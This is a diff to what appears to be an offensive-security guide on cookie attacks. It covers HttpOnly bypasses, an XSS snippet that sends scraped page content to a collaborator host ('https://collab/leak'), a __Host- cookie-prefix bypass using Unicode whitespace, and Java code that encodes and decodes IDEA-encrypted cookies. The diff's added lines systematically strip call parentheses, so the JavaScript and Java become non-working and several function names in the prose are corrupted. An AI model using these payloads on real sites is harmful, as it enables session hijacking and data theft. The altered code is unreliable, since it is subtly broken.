@@ -57,7 +57,7 @@ The `HttpOnly` flag prevents **client-side JavaScript** from reading the cookie 
 
 #### **Bypasses**
 
-- If a page **returns cookies in the response body** (for example, a **phpinfo()** page), XSS may fetch that page and steal the reflected cookie despite `HttpOnly`.<sup>[[6]](#references)</sup><sup>[[17]](#references)</sup>
+- If a page **returns cookies in the response body** (for example, a **phpinfo** page), XSS may fetch that page and steal the reflected cookie despite `HttpOnly`.<sup>[[6]](#references)</sup><sup>[[17]](#references)</sup>
 - This could be Bypassed with **TRACE** **HTTP** requests as the response from the server (if this HTTP method is available) will reflect the cookies sent. This technique is called **Cross-Site Tracking**.<sup>[[5]](#references)</sup>
   - This technique is avoided by **modern browsers by not permitting sending a TRACE** request from JS. However, some bypasses to this have been found in specific software like sending `\r\nTRACE` instead of `TRACE` to IE6.0 SP2.
 - Another way is the exploitation of zero/day vulnerabilities of the browsers.
@@ -73,7 +73,7 @@ cookie-jar-overflow.md
 // Extract content between <!-- startscrmprint --> ... <!-- stopscrmprint -->
 const re = /<!-- startscrmprint -->([\s\S]*?)<!-- stopscrmprint -->/;
 fetch('/index.php?module=Touch&action=ws')
-  .then(r => r.text())
+  .then(r => r.text)
   .then(t => { const m = re.exec(t); if (m) fetch('https://collab/leak', {method:'POST', body: JSON.stringify({leak: btoa(m[1])})}); });
 ```
 
@@ -116,7 +116,7 @@ document.cookie = `${String.fromCodePoint(0x2000)}__Host-name=injected; Domain=.
 ```
 
 - Typical backend behavior that enables the issue:
-  - Frameworks that trim/normalize cookie keys. In Django, Python’s `str.strip()` removes a wide range of Unicode whitespace code points, causing the name to normalize to `__Host-name`.
+  - Frameworks that trim/normalize cookie keys. In Django, Python’s `str.strip` removes a wide range of Unicode whitespace code points, causing the name to normalize to `__Host-name`.
   - Commonly trimmed code points include: U+0085 (NEL, 133), U+00A0 (NBSP, 160), U+1680 (5760), U+2000–U+200A (8192–8202), U+2028 (8232), U+2029 (8233), U+202F (8239), U+205F (8287), U+3000 (12288).
   - Many frameworks resolve duplicate cookie names as “last wins”, so the attacker-controlled normalized cookie value overwrites the legitimate one.
 
@@ -410,32 +410,32 @@ public class App {
     public String encode(char[] plainArray) { return encode(new String(plainArray)); }
 
     public String encode(String plain) {
-        IDEAKeyGenerator keygen = new IDEAKeyGenerator();
-        IDEA encrypt = new IDEA();
+        IDEAKeyGenerator keygen = new IDEAKeyGenerator;
+        IDEA encrypt = new IDEA;
         Key key;
         try {
-            key = keygen.generateKey(this.ideaKey.getBytes());
+            key = keygen.generateKey(this.ideaKey.getBytes);
             encrypt.initEncrypt(key);
         } catch (KeyException e) { return null; }
-        if (plain.length() == 0 || plain.length() % encrypt.getInputBlockSize() > 0) {
-            for (int currentPad = plain.length() % encrypt.getInputBlockSize(); currentPad < encrypt.getInputBlockSize(); currentPad++) {
+        if (plain.length == 0 || plain.length % encrypt.getInputBlockSize > 0) {
+            for (int currentPad = plain.length % encrypt.getInputBlockSize; currentPad < encrypt.getInputBlockSize; currentPad++) {
                 plain = plain + " "; // space padding
             }
         }
-        byte[] encrypted = encrypt.update(plain.getBytes());
+        byte[] encrypted = encrypt.update(plain.getBytes);
         return Hex.toString(encrypted); // cookie expects hex
     }
 
     public String decode(String chiffre) {
-        IDEAKeyGenerator keygen = new IDEAKeyGenerator();
-        IDEA decrypt = new IDEA();
+        IDEAKeyGenerator keygen = new IDEAKeyGenerator;
+        IDEA decrypt = new IDEA;
         Key key;
         try {
-            key = keygen.generateKey(this.ideaKey.getBytes());
+            key = keygen.generateKey(this.ideaKey.getBytes);
             decrypt.initDecrypt(key);
         } catch (KeyException e) { return null; }
         byte[] decrypted = decrypt.update(Hex.fromString(chiffre));
-        try { return new String(decrypted, "ISO_8859-1").trim(); } catch (UnsupportedEncodingException e) { return null; }
+        try { return new String(decrypted, "ISO_8859-1").trim; } catch (UnsupportedEncodingException e) { return null; }
     }
 
     public void setKey(String key) { this.ideaKey = key; }
@@ -473,7 +473,7 @@ python3 forge_cookie.py --target <target> --context both --user admin
 - [3] [LinkedIn post](https://www.linkedin.com/posts/rickey-martin-24533653_100daysofhacking-penetrationtester-ethicalhacking-activity-7016286424526180352-bwDd)
 - [4] [Bypassing WAFs with the phantom $Version cookie](https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie)
 - [5] [seclists webappsec - Cross-Site Tracing (TRACE method cookie disclosure)](https://seclists.org/webappsec/2006/q2/181)
-- [6] [Michal Spacek - Stealing session IDs with phpinfo() and how to stop it](https://www.michalspacek.com/stealing-session-ids-with-phpinfo-and-how-to-stop-it)
+- [6] [Michal Spacek - Stealing session IDs with phpinfo and how to stop it](https://www.michalspacek.com/stealing-session-ids-with-phpinfo-and-how-to-stop-it)
 - [7] [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
 - [8] [Cookie Chaos: How to bypass __Host and __Secure cookie prefixes](https://portswigger.net/research/cookie-chaos-how-to-bypass-host-and-secure-cookie-prefixes)
 - [9] [Burp Custom Action – CookiePrefixBypass.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/CookiePrefixBypass.bambda)
